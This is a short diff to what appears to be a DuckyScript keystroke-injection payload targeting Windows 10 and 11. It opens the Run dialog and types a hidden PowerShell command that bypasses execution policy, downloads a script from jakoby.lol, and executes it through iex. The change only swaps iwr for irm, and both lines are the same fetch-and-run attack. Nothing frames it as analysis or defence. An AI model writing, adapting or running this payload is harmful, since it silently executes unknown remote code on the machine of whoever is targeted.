@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $channel='youtube.com/iamjakoby';iwr jakoby.lol/wj4 | iex
+STRING powershell -w h -NoP -Ep Bypass $channel='youtube.com/iamjakoby';irm jakoby.lol/wj4 | iex
 ENTER
